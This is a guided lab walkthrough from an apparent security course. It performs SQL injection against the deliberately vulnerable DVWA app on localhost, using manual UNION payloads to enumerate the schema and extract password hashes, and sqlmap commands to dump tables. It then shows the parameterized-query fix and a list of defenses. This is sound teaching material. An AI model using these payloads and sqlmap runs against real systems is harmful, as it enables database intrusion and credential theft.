# Module 15 — SQL Injection · Guided Lab Walkthrough

> Step-by-step against **DVWA in your own Docker lab** ([`../../labs/docker-compose.yml`](../../labs/docker-compose.yml)) — never a site you don't own. Each step: command/payload, what you should see, a hint, and the defender/PAM takeaway. Outputs are **representative**.

**Goal:** exploit SQLi by hand (understand it), confirm with sqlmap (automate it), then watch the **parameterized-query fix** shut it down.

**Target:** DVWA at `http://localhost:8081` — page *SQL Injection*. Set **DVWA Security = Low** to start. Grab your `PHPSESSID` and `security` cookies from the browser (DevTools → Application → Cookies).

---

## Part A — Manual exploitation (the understanding)

### A1. Detect
In the *SQL Injection* box, submit `1`, then `1'`.
- `1` → returns one user row (normal).
- `1'` → **you should see** a SQL error or a broken page:
```
You have an error in your SQL syntax; ... near '''' at line 1
```
**Observe:** a single quote changed the query's structure ⇒ injectable.

### A2. Count columns
Submit: `1' ORDER BY 2 -- -` then `1' ORDER BY 3 -- -`.
- `ORDER BY 2` → OK. `ORDER BY 3` → **error**. So the query has **2 columns**.

<details><summary>Hint</summary>Always include the trailing `-- -` (dash-dash-space-dash) to comment out the rest of the original query. Increment until the first error; the last working number is the column count.</details>

### A3. UNION to surface data
Submit: `1' UNION SELECT 1,2 -- -` → **you should see** `First name: 1 / Surname: 2` (both columns display). Then fingerprint:
```sql
1' UNION SELECT version(), database() -- -
```
**You should see** something like `First name: 5.7.x / Surname: dvwa`.

### A4. Enumerate schema
```sql
1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa' -- -
1' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users' -- -
```
**You should see** the `users` table and columns `user`, `password`, `user_id`, ...

### A5. Extract credentials
```sql
1' UNION SELECT user, password FROM users -- -
```
**You should see** usernames with **MD5 password hashes**:
```
admin : 5f4dcc3b5aa765d61d8327deb882cf99
```
**Observe:** the hashes are **fast, unsalted MD5** — crack them with `hashcat -m 0` in seconds (ties to Module 20). **This is the full chain: injection → schema → data → offline crack.**

**Defender/PAM view:** the DB account DVWA uses is over-privileged and its password sits in config. In production: **least-privilege DB account** + [CCP/Conjur-delivered, CPM-rotated credential](../../defender-pam/cyberark-attack-mapping.md).

---

## Part B — Automate & confirm with sqlmap
```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<yours>; security=low" --batch --dbs
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<yours>; security=low" --batch -D dvwa -T users --dump
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<yours>; security=low" --batch --current-user --is-dba
```
**You should see** sqlmap identify the injection technique(s), dump the `users` table (and offer to crack the hashes with its built-in dictionary), and report whether the account is a DBA.

<details><summary>Hint: sqlmap says "not injectable"</summary>Your cookie is stale or `security` isn't `low`. Re-copy `PHPSESSID` from the browser and confirm `security=low`. Add `--level=2 --risk=2` to widen tests.</details>

**Observe:** `--is-dba: True` (or a high-privilege user) is the amplifier — an over-privileged DB account is what turns SQLi into file read/write and potential RCE.

---

## Part C — Watch the fix work
Raise **DVWA Security** to **Impossible** and re-run A1 and Part B.
- Manual `1'` → **no error, no injection**; the page treats it as a literal id.
- sqlmap → **"target does not seem to be injectable."**

Open DVWA's **View Source** for Low vs Impossible and compare:
```php
// LOW: input concatenated straight into the query
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

// IMPOSSIBLE: parameterized (PDO prepared statement + bound param)
$data = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
$data->bindParam(':id', $id, PDO::PARAM_INT);
```
**You just demonstrated the control.** The fix is **not** a blocklist or a WAF — it's **binding the parameter** so input can never be parsed as SQL.

---

## What you should conclude
| Step | Real-world defense |
|---|---|
| `1'` caused an error | Parameterized queries (primary) |
| Dumped `users` | Least-privilege DB account |
| `--is-dba: True` | No DBA/`sa` for app accounts; disable `xp_cmdshell` |
| MD5 hashes cracked | Slow, salted KDFs (bcrypt/Argon2) |
| Creds in DVWA config | Vault + CPM-rotate; deliver via CCP/Conjur |

## Cleanup
```bash
# nothing persistent created; reset DVWA via its "Setup / Reset DB" page if desired
```

## Record it
Log payloads, outputs, and the Low-vs-Impossible source diff in the **My lab log** table in [README.md](README.md); note misses in [PROGRESS.md](../../PROGRESS.md).
